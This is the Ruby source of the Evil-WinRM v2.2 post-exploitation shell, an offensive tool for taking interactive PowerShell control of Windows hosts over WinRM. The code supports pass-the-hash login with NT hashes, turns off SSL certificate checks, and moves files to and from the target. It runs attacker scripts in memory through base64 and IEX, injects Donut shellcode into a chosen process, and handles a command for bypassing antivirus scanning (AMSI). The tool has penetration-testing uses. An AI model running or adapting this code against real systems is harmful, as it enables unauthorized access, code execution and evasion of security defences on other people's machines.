#!/usr/bin/env ruby
# -*- encoding : utf-8 -*-
# Author: CyberVaca
# Twitter: https://twitter.com/CyberVaca_
# Based on the Alamot's original code

# Dependencies
require 'winrm'
require 'winrm-fs'
require 'stringio'
require 'base64'
require 'readline'
require 'optionparser'
require 'io/console'
require 'time'

# Constants

# Version
VERSION = '2.2'

# Msg types
TYPE_INFO = 0
TYPE_ERROR = 1
TYPE_WARNING = 2
TYPE_DATA = 3

# Global vars

# Available commands
$LIST = ['upload', 'download', 'exit', 'menu', 'services'].sort
$LISTASSEM = [''].sort
$DONUTPARAM1 = ['-process_id']
$DONUTPARAM2 = ['-donutfile']

# Colors
$colors_enabled = true

# Path for ps1 scripts and exec files
$scripts_path = ""
$executables_path = ""

# Connection vars initialization
$host = ""
$port = "5985"
$user = ""
$password = ""
$url = "wsman"

# Redefine download method from winrm-fs
module WinRM
    module FS
        class FileManager
            def download(remote_path, local_path, chunk_size = 1024 * 1024, first = true, size: -1)
                @logger.debug("downloading: #{remote_path} -> #{local_path} #{chunk_size}")
                index = 0
                output = _output_from_file(remote_path, chunk_size, index)
                return download_dir(remote_path, local_path, chunk_size, first) if output.exitcode == 2

                return false if output.exitcode >= 1

                File.open(local_path, 'wb') do |fd|
                    out = _write_file(fd, output)
                    index += out.length
                    until out.empty?
                        if size != -1
                            yield index, size
                        end
                        output = _output_from_file(remote_path, chunk_size, index)
                        return false if output.exitcode >= 1

                        out = _write_file(fd, output)
                        index += out.length
                    end
                end
            end

            true
        end
    end
end

# Class creation
class EvilWinRM

    # Arguments
    def arguments()
        options = { port:$port, url:$url }
        optparse = OptionParser.new do |opts|
            opts.banner = "Usage: evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM]"
            opts.on("-S", "--ssl", "Enable ssl") do |val|
                $ssl = true
                options[:port] = "5986"
            end
            opts.on("-c", "--pub-key PUBLIC_KEY_PATH", "Local path to public key certificate") { |val| options[:pub_key] = val }
            opts.on("-k", "--priv-key PRIVATE_KEY_PATH", "Local path to private key certificate") { |val| options[:priv_key] = val }
            opts.on("-r", "--realm DOMAIN", "Kerberos auth, it has to be set also in /etc/krb5.conf file using this format -> CONTOSO.COM = { kdc = fooserver.contoso.com }") { |val| options[:realm] = val.upcase }
            opts.on("-s", "--scripts PS_SCRIPTS_PATH", "Powershell scripts local path") { |val| options[:scripts] = val }
            opts.on("-e", "--executables EXES_PATH", "C# executables local path") { |val| options[:executables] = val }
            opts.on("-i", "--ip IP", "Remote host IP or hostname. FQDN for Kerberos auth (required)") { |val| options[:ip] = val }
            opts.on("-U", "--url URL", "Remote url endpoint (default /wsman)") { |val| options[:url] = val }
            opts.on("-u", "--user USER", "Username (required)") { |val| options[:user] = val }
            opts.on("-p", "--password PASS", "Password") { |val| options[:password] = val }
            opts.on("-H", "--hash HASH", "NTHash") do |val|
                if !options[:password].nil? and !val.nil?
                    self.print_header()
                    self.print_message("You must choose either password or hash auth. Both at the same time are not allowed", TYPE_ERROR)
                    self.custom_exit(1, false)
                end
                if !val.match /^[a-fA-F0-9]{32}$/
                    self.print_header()
                    self.print_message("Invalid hash format", TYPE_ERROR)
                    self.custom_exit(1, false)
                end
                options[:password] = "00000000000000000000000000000000:#{val}"
            end
            opts.on("-P", "--port PORT", "Remote host port (default 5985)") { |val| options[:port] = val }
            opts.on("-V", "--version", "Show version") do |val|
                puts("v#{VERSION}")
                self.custom_exit(0, false)
            end
            opts.on("-n", "--no-colors", "Disable colors") do |val|
                $colors_enabled = false
            end
            opts.on('-h', '--help', 'Display this help message') do
                self.print_header()
                puts(opts)
                puts()
                self.custom_exit(0, false)
            end
        end

        begin
            optparse.parse!
        if options[:realm].nil? and options[:priv_key].nil? and options[:pub_key].nil? then
            mandatory = [:ip, :user]
        else
            mandatory = [:ip]
        end
            missing = mandatory.select{ |param| options[param].nil? }
            unless missing.empty?
                raise OptionParser::MissingArgument.new(missing.join(', '))
            end
        rescue OptionParser::InvalidOption, OptionParser::MissingArgument
            self.print_header()
            self.print_message($!.to_s, TYPE_ERROR)
            puts(optparse)
            puts()
            custom_exit(1, false)
        end

        if options[:password].nil? and options[:realm].nil? and options[:priv_key].nil? and options[:pub_key].nil?
            options[:password] = STDIN.getpass(prompt='Enter Password: ')
        end

        $host = options[:ip]
        $user = options[:user]
        $password = options[:password]
        $port = options[:port]
        $scripts_path = options[:scripts]
        $executables_path = options[:executables]
        $url = options[:url]
        $pub_key = options[:pub_key]
        $priv_key = options[:priv_key]
        $realm = options[:realm]
    end

    # Print script header
    def print_header()
         puts()
         self.print_message("Evil-WinRM shell v#{VERSION}", TYPE_INFO, false)
     end

    # Generate connection object
    def connection_initialization()
        if $ssl then
            if $pub_key and $priv_key then
                $conn = WinRM::Connection.new(
                    endpoint: "https://#{$host}:#{$port}/#{$url}",
                    user: $user,
                    password: $password,
                    :no_ssl_peer_verification => true,
                    transport: :ssl,
                    client_cert: $pub_key,
                    client_key: $priv_key,
                )
            else
                $conn = WinRM::Connection.new(
                    endpoint: "https://#{$host}:#{$port}/#{$url}",
                    user: $user,
                    password: $password,
                    :no_ssl_peer_verification => true,
                    transport: :ssl
                )
            end

        elsif !$realm.nil? then
            $conn = WinRM::Connection.new(
                endpoint: "http://#{$host}:#{$port}/#{$url}",
                user: "",
                password: "",
                transport: :kerberos,
                realm: $realm
            )
        else
            $conn = WinRM::Connection.new(
                endpoint: "http://#{$host}:#{$port}/#{$url}",
                user: $user,
                password: $password,
                :no_ssl_peer_verification => true
            )
        end
    end

    # Detect if a docker environment
    def docker_detection()
        if File.exist?("/.dockerenv") then
            return true
        else
            return false
        end
    end

    # Define colors
    def colorize(text, color = "default")
        colors = {"default" => "38", "blue" => "34", "red" => "31", "yellow" => "1;33", "magenta" => "35"}
        color_code = colors[color]
        return "\033[0;#{color_code}m#{text}\033[0m"
    end

    # Messsage printing
    def print_message(msg, msg_type, prefix_print=true)
        if msg_type == TYPE_INFO then
            msg_prefix = "Info: "
            color = "blue"
        elsif msg_type == TYPE_WARNING then
            msg_prefix = "Warning: "
            color = "yellow"
        elsif msg_type == TYPE_ERROR then
            msg_prefix = "Error: "
            color = "red"
        elsif msg_type == TYPE_DATA then
            msg_prefix = "Data: "
            color = 'magenta'
        else
            msg_prefix = ""
            color = "default"
        end

        if !prefix_print then
            msg_prefix = ""
        end

        if $colors_enabled then
            puts(self.colorize("#{msg_prefix}#{msg}", color))
        else
            puts("#{msg_prefix}#{msg}")
        end
        puts()
    end

    # Certificates validation
    def check_certs(pub_key, priv_key)
         if !File.file?(pub_key) then
            self.print_message("Path to provided public certificate file \"#{pub_key}\" can't be found. Check filename or path", TYPE_ERROR)
            self.custom_exit(1)
        end

        if !File.file?($priv_key) then
            self.print_message("Path to provided private certificate file \"#{priv_key}\" can't be found. Check filename or path", TYPE_ERROR)
            self.custom_exit(1)
        end
    end

    # Directories validation
    def check_directories(path, purpose)
        if path == "" then
            self.print_message("The directory used for #{purpose} can't be empty. Please set a path", TYPE_ERROR)
            self.custom_exit(1)
        end

        if !(/cygwin|mswin|mingw|bccwin|wince|emx/ =~ RUBY_PLATFORM).nil? then
            # Windows
            if path[-1] != "\\" then
                path.concat("\\")
            end
        else
            # Unix
            if path[-1] != "/" then
                path.concat("/")
            end
        end

        if !File.directory?(path) then
            self.print_message("The directory \"#{path}\" used for #{purpose} was not found", TYPE_ERROR)
            self.custom_exit(1)
        end

        if purpose == "scripts" then
            $scripts_path = path
        elsif purpose == "executables" then
            $executables_path = path
        end
    end

    # Silent warnings
    def silent_warnings
        old_stderr = $stderr
        $stderr = StringIO.new
        yield
    ensure
        $stderr = old_stderr
    end

    # Read powershell script files
    def read_scripts(scripts)
        files = Dir.entries(scripts).select{ |f| File.file? File.join(scripts, f) }
        return files
    end

    # Read executable files
    def read_executables(executables)
        files = Dir.glob("#{executables}*.exe", File::FNM_DOTMATCH)
        return files
    end

    # Read local files and directories names
    def paths(directory)
        files = Dir.glob("#{directory}*.*", File::FNM_DOTMATCH)
        directories = Dir.glob("#{directory}*").select {|f| File.directory? f}
        return files + directories
    end

    # Custom exit
    def custom_exit(exit_code = 0, message_print=true)
        if message_print then
            if exit_code == 0 then
                puts()
                self.print_message("Exiting with code #{exit_code.to_s}", TYPE_INFO)
            elsif exit_code == 1 then
                self.print_message("Exiting with code #{exit_code.to_s}", TYPE_ERROR)
            elsif exit_code == 130 then
                puts()
                self.print_message("Exiting...", TYPE_INFO)
            else
                self.print_message("Exiting with code #{exit_code.to_s}", TYPE_ERROR)
            end
        end
        exit(exit_code)
    end

    # Progress bar
    def progress_bar(bytes_done, total_bytes)
            progress = ((bytes_done.to_f / total_bytes.to_f) * 100).round
            progress_bar = (progress / 10).round
            progress_string = "▓" * (progress_bar-1).clamp(0,9)
            progress_string = progress_string + "▒" + ("░" * (10-progress_bar))
            message = "Progress: #{progress}% : |#{progress_string}|          \r"
            print message
            $stdout.flush
    end

    # Get filesize
    def filesize(shell, path)
        size = shell.run("(get-item '#{path}').length").output.strip.to_i
        return size
    end

    # Main function
    def main
        self.arguments()
        self.connection_initialization()
        file_manager = WinRM::FS::FileManager.new($conn)
        self.print_header()

        # SSL checks
        if !$ssl and ($pub_key or $priv_key) then
            self.print_message("Useless cert/s provided, SSL is not enabled", TYPE_WARNING)
        elsif $ssl
            self.print_message("SSL enabled", TYPE_WARNING)
        end

        if $ssl and ($pub_key or $priv_key) then
            self.check_certs($pub_key, $priv_key)
        end

        # Kerberos checks
         if !$user.nil? and !$realm.nil?
            self.print_message("User is not needed for Kerberos auth. Ticket will be used", TYPE_WARNING)
        end

        if !$password.nil? and !$realm.nil?
            self.print_message("Password is not needed for Kerberos auth. Ticket will be used", TYPE_WARNING)
        end

        if !$scripts_path.nil? then
            self.check_directories($scripts_path, "scripts")
            functions = self.read_scripts($scripts_path)
            self.silent_warnings do
                $LIST = $LIST + functions
            end
        end

        if !$executables_path.nil? then
            self.check_directories($executables_path, "executables")
            executables = self.read_executables($executables_path)
        end
        menu = Base64.decode64("")
        completion =
            proc do |str|
              case
              when Readline.line_buffer =~ /help.*/i
                puts("#{$LIST.join("\t")}")
              when Readline.line_buffer =~ /\[.*/i
                $LISTASSEM.grep( /^#{Regexp.escape(str)}/i ) unless str.nil?              
              when Readline.line_buffer =~ /Invoke-Binary.*/i
                executables.grep( /^#{Regexp.escape(str)}/i ) unless str.nil?
              when Readline.line_buffer =~ /donutfile.*/i
                paths = self.paths(str)
                paths.grep( /^#{Regexp.escape(str)}/i ) unless str.nil?
              when Readline.line_buffer =~ /Donut-Loader -process_id.*/i
                $DONUTPARAM2.grep( /^#{Regexp.escape(str)}/i ) unless str.nil?
              when Readline.line_buffer =~ /Donut-Loader.*/i
                $DONUTPARAM1.grep( /^#{Regexp.escape(str)}/i ) unless str.nil?
              when Readline.line_buffer =~ /upload.*/i
                paths = self.paths(str)
                paths.grep( /^#{Regexp.escape(str)}/i ) unless str.nil?
              else
                $LIST.grep( /^#{Regexp.escape(str)}/i ) unless str.nil?
              end
            end

        Readline.completion_proc = completion
        Readline.completion_append_character = ''

        command = ""

        begin
            time = Time.now.to_i
            self.print_message("Establishing connection to remote endpoint", TYPE_INFO)
            $conn.shell(:powershell) do |shell|
                begin
                    until command == "exit" do
                        pwd = shell.run("(get-location).path").output.strip
                        if $colors_enabled then
                            command = Readline.readline(self.colorize("*Evil-WinRM*", "red") + self.colorize(" PS ", "yellow") + pwd + "> ", true)
                        else
                            command = Readline.readline("*Evil-WinRM* PS " + pwd + "> ", true)
                        end

                        if command.start_with?('upload') then
                            if self.docker_detection() then
                                puts()
                                self.print_message("Remember that in docker environment all local paths should be at /data and it must be mapped correctly as a volume on docker run command", TYPE_WARNING)
                            end

                            upload_command = command.tokenize
                            command = ""

                            if upload_command[2].to_s.empty? then
                                upload_command[2] = "#{pwd}\\#{upload_command[1].split('/')[-1]}"
                            elsif not upload_command[2].index ':\\'
                                upload_command[2] = "#{pwd}\\#{upload_command[2]}"
                            end
                            begin
                                self.print_message("Uploading #{upload_command[1]} to #{upload_command[2]}", TYPE_INFO)
                                file_manager.upload(upload_command[1], upload_command[2]) do |bytes_copied, total_bytes|
                                    progress_bar(bytes_copied, total_bytes)
                                    if bytes_copied == total_bytes then
                                        puts("                                                             ")
                                        self.print_message("#{bytes_copied} bytes of #{total_bytes} bytes copied", TYPE_DATA)
                                        self.print_message("Upload successful!", TYPE_INFO)
                                    end
                                end
                            rescue
                                self.print_message("Upload failed. Check filenames or paths", TYPE_ERROR)
                            end
                        elsif command.start_with?('download') then
                            if self.docker_detection() then
                                puts()
                                self.print_message("Remember that in docker environment all local paths should be at /data and it must be mapped correctly as a volume on docker run command", TYPE_WARNING)
                            end

                            download_command = command.tokenize
                            command = ""

                            if not download_command[1].index ':\\' then download_command[1] = "#{pwd}\\#{download_command[1]}" end

                            if download_command[2].to_s.empty? then download_command[2] = download_command[1].split('\\')[-1] end

                            begin
                                self.print_message("Downloading #{download_command[1]} to #{download_command[2]}", TYPE_INFO)
                                size = self.filesize(shell, download_command[1])
                                file_manager.download(download_command[1], download_command[2], size: size) do | index, size |
                                    progress_bar(index, size)
                                end
                                puts("                                                             ")
                                self.print_message("Download successful!", TYPE_INFO)
                            rescue
                                self.print_message("Download failed. Check filenames or paths", TYPE_ERROR)
                            end

                        elsif command.start_with?('Invoke-Binary') then
                            begin
                                invoke_Binary = command.tokenize
                                command = ""
                                if !invoke_Binary[1].to_s.empty? then
                                    load_executable = invoke_Binary[1]
                                    load_executable = File.binread(load_executable)
                                    load_executable = Base64.strict_encode64(load_executable)
                                    if !invoke_Binary[2].to_s.empty?
                                        output = shell.run("Invoke-Binary " + load_executable + " ," + invoke_Binary[2])
                                    elsif invoke_Binary[2].to_s.empty?
                                        output = shell.run("Invoke-Binary " + load_executable)
                                    end
                                elsif
                                    output = shell.run("Invoke-Binary")
                                end
                                print(output.output)
                            rescue
                                self.print_message("Check filenames", TYPE_ERROR)
                            end

                        elsif command.start_with?('Donut-Loader') then
                            begin
                                donut_Loader = command.tokenize
                                command = ""
                                if !donut_Loader[4].to_s.empty? then
                                    pid = donut_Loader[2]
                                    load_executable = donut_Loader[4]
                                    load_executable = File.binread(load_executable)
                                    load_executable = Base64.strict_encode64(load_executable)
                                    output = shell.run("Donut-Loader -process_id #{pid} -donutfile #{load_executable}")
                                elsif
                                    output = shell.run("Donut-Loader")
                                end
                                print(output.output)
                            rescue
                                self.print_message("Check filenames", TYPE_ERROR)
                            end

                        elsif command.start_with?('services') then
                            command = ""
                            output = shell.run('Get-ItemProperty "registry::HKLM\System\CurrentControlSet\Services\*" | Where-Object {$_.imagepath -notmatch "system" -and $_.imagepath -ne $null } | Select-Object pschildname,imagepath | fl')
                            print(output.output.chomp)

                        elsif command.start_with?(*functions) then
                            self.silent_warnings do
                                load_script = $scripts_path + command
                                command = ""
                                load_script = load_script.gsub(" ","")
                                load_script = File.binread(load_script)
                                load_script = Base64.strict_encode64(load_script)
                                script_split = load_script.scan(/.{1,5000}/)
                                script_split.each do |item|
                                    output = shell.run("$a += '#{item}'")
                                end
                                output = shell.run("IEX ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($a))).replace('???','')")
                                output = shell.run("$a = $null")
                            end

                        elsif command.start_with?('menu') then
                            command = ""
                            self.silent_warnings do
                                output = shell.run(menu)
                                output = shell.run("Menu")
                                autocomplete = shell.run("auto").output.chomp
                                autocomplete = autocomplete.gsub!(/\r\n?/, "\n")
                                assemblyautocomplete = shell.run("show-methods-loaded").output.chomp
                                assemblyautocomplete = assemblyautocomplete.gsub!(/\r\n?/, "\n")
                                if !assemblyautocomplete.to_s.empty?
                                    $LISTASSEMNOW = assemblyautocomplete.split("\n")
                                    $LISTASSEM = $LISTASSEM + $LISTASSEMNOW
                                end
                                $LIST2 = autocomplete.split("\n")
                                $LIST = $LIST + $LIST2
                                print(output.output)
                            end

                        elsif (command == "Bypass-4MSI") and (Time.now.to_i < time + 20)
                            puts()
                            self.print_message("AV could be still watching for suspicious activity. Waiting for patching...", TYPE_WARNING)
                            sleep(9)
                        end

                        output = shell.run(command) do |stdout, stderr|
                            stdout&.each_line do |line|
                                STDOUT.puts(line.rstrip!)
                            end
                            STDERR.print(stderr)
                        end
                    end
                rescue Interrupt
                    puts("\n\n")
                    self.print_message("Press \"y\" to exit, press any other key to continue", TYPE_WARNING)
                    if STDIN.getch.downcase == "y"
                        self.custom_exit(130)
                    else
                        retry
                    end
                end
            self.custom_exit(0)
        end
        rescue SystemExit
        rescue SocketError
            self.print_message("Check your /etc/hosts file to ensure you can resolve #{$host}", TYPE_ERROR)
            self.custom_exit(1)
        rescue Exception => ex
            self.print_message("An error of type #{ex.class} happened, message is #{ex.message}", TYPE_ERROR)
            self.custom_exit(1)
        end
    end
end

# Class to create array (tokenize) from a string
class String def tokenize
    self.
        split(/\s(?=(?:[^'"]|'[^']*'|"[^"]*")*$)/).
        select {|s| not s.empty? }.
        map {|s| s.gsub(/(^ +)|( +$)|(^["']+)|(["']+$)/,'')}
    end
end

# Execution
e = EvilWinRM.new
e.main
